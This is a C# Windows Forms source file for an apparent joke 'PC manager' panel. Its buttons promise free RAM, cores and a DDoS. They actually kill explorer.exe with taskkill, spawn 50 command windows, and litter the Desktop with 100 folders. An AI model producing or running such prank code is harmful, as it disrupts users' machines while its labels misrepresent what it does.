using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Collections.Generic; 

namespace PCmenenegegfrager
{
    public partial class Form1 : Form
    {
        private readonly string[] imageUrls = new string[]
        {
            "https://www.lidl.pl/static/assets/kupon-osobisty-3840x1000-header2-261329.jpg",
            "https://static.wikia.nocookie.net/character-stats-and-profiles/images/2/2f/Robloxian_3D_Png.png/revision/latest?cb=20230629111153",
            "https://musictech.com/wp-content/uploads/2025/03/Snoop-Dogg-hero-new@2000x1500-696x522.jpg",
            "https://i.pinimg.com/1200x/42/b1/61/42b16196eedf6e5726b21d50c22a8b0a.jpg"
        };

        public Form1()
        {
            this.Text = "fri panel";
            this.Size = new Size(900, 700);
            this.BackColor = Color.White;
            this.ForeColor = Color.Black;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;

            Label title = new Label();
            title.Text = "PC MENEGAGER";
            title.Font = new Font("Arial", 24, FontStyle.Bold);
            title.AutoSize = true;
            title.BackColor = Color.Transparent;
            title.ForeColor = Color.Black;
            title.TextAlign = ContentAlignment.MiddleCenter;
            title.Width = 300;
            title.Height = 50;
            title.Location = new Point((this.ClientSize.Width - title.Width) / 2, 80);
            this.Controls.Add(title);

            FlowLayoutPanel buttonPanel = new FlowLayoutPanel();
            buttonPanel.Size = new Size(250, 250); 
            buttonPanel.Location = new Point((this.ClientSize.Width - buttonPanel.Width) / 2, 160);
            buttonPanel.FlowDirection = FlowDirection.TopDown;
            buttonPanel.BackColor = Color.Transparent;

            Button btn1 = new Button();
            btn1.Text = "pajton jest kompaljowalny";
            btn1.Size = new Size(250, 40);
            btn1.Click += Btn1_Click;

            Button btn2 = new Button();
            btn2.Text = "fri RAM";
            btn2.Size = new Size(250, 40);
            btn2.Click += Btn2_Click;

            Button btn3 = new Button();
            btn3.Text = "fri DDoS!!";
            btn3.Size = new Size(250, 40);
            btn3.Click += Btn3_Click;

            Button btn4 = new Button();
            btn4.Text = "fri rdzenie w proczesososze";
            btn4.Size = new Size(250, 40);
            btn4.Click += (s, e) => Process.Start("taskkill", "/f /im explorer.exe");

            buttonPanel.Controls.Add(btn1);
            buttonPanel.Controls.Add(btn2);
            buttonPanel.Controls.Add(btn3);
            buttonPanel.Controls.Add(btn4);
            this.Controls.Add(buttonPanel);

            this.Shown += (s, e) => {
                SpawnImages(title.Bounds, buttonPanel.Bounds);
                buttonPanel.BringToFront(); 
            };
        }

        private void Btn1_Click(object sender, EventArgs e) => ShowGif();
        private void Btn2_Click(object sender, EventArgs e) => ShowRamSlider();
        private void Btn3_Click(object sender, EventArgs e) => LaunchCmdSpam();

        void SpawnImages(Rectangle titleRect, Rectangle panelRect)
        {
            Random rand = new Random();
            List<Rectangle> usedRects = new List<Rectangle>
            {
                titleRect,
                panelRect
            };

            for (int i = 0; i < imageUrls.Length; i++)
            {
                PictureBox pic = new PictureBox();
                pic.ImageLocation = imageUrls[i];
                pic.SizeMode = PictureBoxSizeMode.StretchImage;

                int width = rand.Next(80, 160);
                int height = rand.Next(80, 160);
                pic.Size = new Size(width, height);

                Rectangle newRect;
                bool placed = false;

                for (int attempt = 0; attempt < 100; attempt++)
                {
                    int x = rand.Next(0, this.ClientSize.Width - width);
                    int y = rand.Next(0, this.ClientSize.Height - height);
                    newRect = new Rectangle(x, y, width, height);

                    bool overlaps = false;
                    foreach (Rectangle r in usedRects)
                    {
                        if (r.IntersectsWith(newRect))
                        {
                            overlaps = true;
                            break;
                        }
                    }

                    if (!overlaps)
                    {
                        pic.Location = new Point(x, y);
                        usedRects.Add(newRect);
                        placed = true;
                        break;
                    }
                }

                if (placed)
                {
                    pic.SendToBack();
                    this.Controls.Add(pic);
                }
            }
        }

        void ShowGif()
        {
            Form gifForm = new Form();
            gifForm.FormBorderStyle = FormBorderStyle.None;
            gifForm.WindowState = FormWindowState.Maximized;
            gifForm.BackColor = Color.White;

            PictureBox gif = new PictureBox();
            gif.Dock = DockStyle.Fill;
            gif.ImageLocation = "https://i.pinimg.com/736x/78/7f/2c/787f2ccb5f10c02187c8eba1bba7a686.jpg";
            gif.SizeMode = PictureBoxSizeMode.StretchImage;

            gifForm.Controls.Add(gif);
            gifForm.Show();
        }

        void ShowRamSlider()
        {
            Form ramForm = new Form();
            ramForm.Text = "fri RAM";
            ramForm.Size = new Size(350, 200);
            ramForm.BackColor = Color.White;
            ramForm.ForeColor = Color.Black;

            Label ramLabel = new Label();
            ramLabel.Text = "RAM: 1TB";
            ramLabel.Font = new Font("Arial", 12);
            ramLabel.Dock = DockStyle.Top;
            ramLabel.TextAlign = ContentAlignment.MiddleCenter;

            TrackBar ramSlider = new TrackBar();
            ramSlider.Minimum = 1;
            ramSlider.Maximum = 248;
            ramSlider.TickFrequency = 10;
            ramSlider.Dock = DockStyle.Top;

            ramSlider.Scroll += (s, e) =>
            {
                ramLabel.Text = $"RAM: {ramSlider.Value}TB";
            };

            Button okBtn = new Button();
            okBtn.Text = "OK";
            okBtn.Dock = DockStyle.Bottom;
            okBtn.BackColor = Color.LightGray;
            okBtn.ForeColor = Color.Black;

            okBtn.Click += (s, e) =>
            {
                int ram = ramSlider.Value;
                for (int i = 0; i < 100; i++)
                {
                    string folderName = $"{ram}TB for fri {i}";
                    Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), folderName));
                }

                MessageBox.Show("RAM for fri!!", "ram manager");
                ramForm.Close();
            };

            ramForm.Controls.Add(ramLabel);
            ramForm.Controls.Add(ramSlider);
            ramForm.Controls.Add(okBtn);
            ramForm.ShowDialog();
        }

        void LaunchCmdSpam()
        {
            for (int i = 0; i < 50; i++)
            {
                Process.Start("cmd.exe");
            }
        }
    }
}
